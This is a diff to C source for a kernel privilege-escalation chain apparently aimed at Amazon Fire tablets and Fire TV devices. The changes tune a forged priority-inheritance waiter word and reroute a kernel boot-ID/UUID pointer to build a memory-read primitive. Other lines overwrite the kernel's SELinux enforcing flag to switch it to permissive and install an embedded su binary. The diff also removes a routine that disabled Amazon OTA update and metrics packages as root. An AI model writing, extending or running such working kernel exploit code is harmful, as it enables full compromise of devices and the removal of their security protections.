@@ -29,11 +29,23 @@ static int g_root_child_count;
 #ifndef STAMP_FAKE_PRIO
 #define STAMP_FAKE_PRIO 0
 #endif
+#ifndef STAMP_WAITER_PRIO_SHIFT
+#define STAMP_WAITER_PRIO_SHIFT 0
+#endif
+#ifndef STAMP_WAITER_WAKE_STATE
+#define STAMP_WAITER_WAKE_STATE 0
+#endif
+#define STAMP_PRIO_WORD \
+  ((((uint64_t)(uint32_t)(STAMP_FAKE_PRIO)) << (STAMP_WAITER_PRIO_SHIFT)) | \
+   ((uint64_t)(uint32_t)(STAMP_WAITER_WAKE_STATE)))
 #ifndef STAMP_FAKE_TASK_OFF
 #define STAMP_FAKE_TASK_OFF 0
 #endif
 #ifndef STAMP_LOCK_SCRATCH_IMAGE
 #define STAMP_LOCK_SCRATCH_IMAGE PANIC_SCRATCH
+#endif
+#ifndef ROOT_UUID_PARK_IMAGE
+#define ROOT_UUID_PARK_IMAGE PANIC_SCRATCH
 #endif
 #ifndef ROOT_READ_MAX_ATTEMPTS
 #define ROOT_READ_MAX_ATTEMPTS ROOT_SLOT_COUNT
@@ -52,6 +64,7 @@ static uint64_t g_stamp_lock_override;
 static uint64_t g_stamp_delay_override;
 #endif
 static int slot_left(void) { return SLOT_COUNT - g_slot; }
+
 #if defined(STAMP_PER_OP_LOCK_BASE_IMAGE)
 static int logical_left(void) {
   int n = STAMP_PER_OP_COUNT - g_logical_op;
@@ -82,8 +95,14 @@ static int hexv(char c) {
   return -1;
 }
 
+#ifdef ROOT_READ_VIA_UUID
+#define ROOT_UUID_PATH "/proc/sys/kernel/random/uuid"
+#else
+#define ROOT_UUID_PATH "/proc/sys/kernel/random/boot_id"
+#endif
+
 static void read_bootid(char *out, size_t n) {
-  read_first_line("/proc/sys/kernel/random/boot_id", out, n);
+  read_first_line(ROOT_UUID_PATH, out, n);
 }
 
 static int bootid_bytes(unsigned char *o16, char *raw, size_t raw_n) {
@@ -131,7 +150,7 @@ static int stamp_once_raw(uint64_t pc, uint64_t target,
                       (uint64_t)slot * SLOT_STRIDE;
 #endif
   }
-  buf[EXP_W_PI_PRIO]    = STAMP_FAKE_PRIO;
+  buf[EXP_W_PI_PRIO]    = STAMP_PRIO_WORD;
 #ifdef CONSUMER_DELAY_TICKS
   /* Word 10 is outside Tungsten's 64-byte kernel copy.  Use it only as
    * stage metadata so one probe run can sweep adjacent race phases. */
@@ -165,7 +184,7 @@ static int stamp_once_raw(uint64_t pc, uint64_t target,
           (unsigned long long)buf[EXP_W_TREE_LEFT],
           (unsigned long long)buf[EXP_W_TASK],
           (unsigned long long)buf[EXP_W_LOCK],
-          (unsigned)buf[EXP_W_PI_PRIO]);
+          (unsigned)STAMP_FAKE_PRIO);
   int rc = exp_stack_once(buf);
   if (rc != 0) {
     pr_warning("Root stamp: slot=%d stage failed rc=%d\n", slot, rc);
@@ -207,7 +226,7 @@ static int stamp_once(uint64_t pc, uint64_t target) {
   buf[EXP_W_TREE_LEFT] = sentinel;
   buf[EXP_W_TASK] = kaslr_image_addr(STAMP_FAKE_TASK_IMAGE);
   buf[EXP_W_LOCK] = lock;
-  buf[EXP_W_PI_PRIO] = STAMP_FAKE_PRIO;
+  buf[EXP_W_PI_PRIO] = STAMP_PRIO_WORD;
   /* The native stage ignores words 10/11 as timing metadata in two-phase
    * mode and uses them as the second stamp's pc/left pair. */
   buf[10] = pc;
@@ -328,10 +347,17 @@ static int root_read16(uint64_t addr, unsigned char *out16) {
      * __rb_change_child() may place its collateral marker at pc+8 or leave
      * the 16-byte source intact.  A changed proc value proves that the data
      * pointer moved even when the high qword is genuine source data. */
+#ifdef ROOT_READ_VIA_UUID
+    if (hi == bd) {
+      memcpy(out16, r, 16);
+      return 1;
+    }
+#else
     if (hi == bd || strcmp(raw, before) != 0) {
       memcpy(out16, r, 16);
       return 1;
     }
+#endif
   }
   return 0;
 }
@@ -521,66 +547,6 @@ static void wake_root_children(void) {
   }
 }
 
-static void run_pm(const char *action, const char *pkg) {
-  pid_t c = fork();
-  if (c == 0) {
-    int nul = open("/dev/null", O_WRONLY | O_CLOEXEC);
-    if (nul >= 0) {
-      dup2(nul, STDOUT_FILENO);
-      dup2(nul, STDERR_FILENO);
-      if (nul > STDERR_FILENO) close(nul);
-    }
-    setresgid(0, 0, 0);
-    setresuid(0, 0, 0);
-    set_shell_ctx();
-    execl("/system/bin/pm", "pm", action, pkg, (char *)NULL);
-    _exit(127);
-  }
-  if (c > 0) {
-    int st = 0;
-    while (waitpid(c, &st, 0) < 0 && errno == EINTR) {
-    }
-    int ok = WIFEXITED(st) && WEXITSTATUS(st) == 0;
-    pr_info("OTA: pm %s %s %s\n", action, pkg, ok ? "ok" : "not applied");
-  }
-}
-
-static int device_is_firetv(void) {
-  char dev[PROP_VALUE_MAX] = "";
-  __system_property_get("ro.product.device", dev);
-  return strcmp(dev, "karat") == 0;
-}
-
-static void disable_ota(void) {
-  static const char *tablet[][2] = {
-    { "disable", "com.amazon.device.software.ota" },
-    { "disable", "com.amazon.kindle.otter.oobe.forced.ota" },
-  };
-  static const char *firetv[][2] = {
-    { "disable",      "com.amazon.device.software.ota" },
-    { "clear",        "com.amazon.device.software.ota" },
-    { "disable",      "com.amazon.device.software.ota.override" },
-    { "disable-user", "com.amazon.sneakpeek" },
-    { "disable",      "com.amazon.client.metrics" },
-  };
-
-  const char *(*list)[2];
-  size_t n;
-  if (device_is_firetv()) {
-    list = firetv;
-    n = sizeof(firetv) / sizeof(firetv[0]);
-  } else {
-    list = tablet;
-    n = sizeof(tablet) / sizeof(tablet[0]);
-  }
-  for (size_t i = 0; i < n; i++) run_pm(list[i][0], list[i][1]);
-
-  pid_t s = fork();
-  if (s == 0) { execl("/system/bin/sync", "sync", (char *)NULL); _exit(127); }
-  if (s > 0) while (waitpid(s, NULL, 0) < 0 && errno == EINTR) {
-  }
-}
-
 static void root_child_main(int wake_fd) {
   prctl(PR_SET_NAME, (unsigned long)ROOT_CHILD_COMM, 0, 0, 0);
   for (;;) {
@@ -613,7 +579,6 @@ static void root_child_main(int wake_fd) {
           if (c > 0) waitpid(c, NULL, 0);
         }
 
-        disable_ota();
 
         { pid_t sud = -1;
           if (install_embedded_su(&sud))
@@ -779,9 +744,15 @@ int root_chain_run(void) {
   /* Restore the redirected boot-ID pointer only when a spare operation
    * remains.  Root activation takes priority; a reboot restores this
    * volatile pointer if the deeper task search consumes every slot. */
-  if (slot_left() > 0)
+  if (slot_left() > 0) {
+#ifdef ROOT_READ_VIA_UUID
+    root_write(kaslr_image_addr(ROOT_UUID_PARK_IMAGE),
+               kaslr_image_addr(BOOTID_DATA));
+#else
     root_write(kaslr_image_addr(SLIDE_SYSCTL_BOOTID_IMAGE),
                kaslr_image_addr(BOOTID_DATA));
+#endif
+  }
 
 #ifndef ROOT_KEEP_SELINUX_ENFORCING
 #ifdef SELINUX_ZERO_PC_IMAGE
@@ -789,9 +760,10 @@ int root_chain_run(void) {
 #else
   uint64_t perm = (kaslr_image_addr(PANIC_SCRATCH) & ~0xffffULL) | 0x10000ULL;
 #endif
-  if (slot_left() > 0)
+  if (slot_left() > 0) {
     root_write(perm, kaslr_image_addr(SELINUX_ENFORCING));
-  for (int i = 0; i < 20 && !selinux_permissive(); i++) usleep(100000);
+    for (int i = 0; i < 20 && !selinux_permissive(); i++) usleep(100000);
+  }
 #endif
 
   /* Keep all candidates blocked throughout the race and the two credential
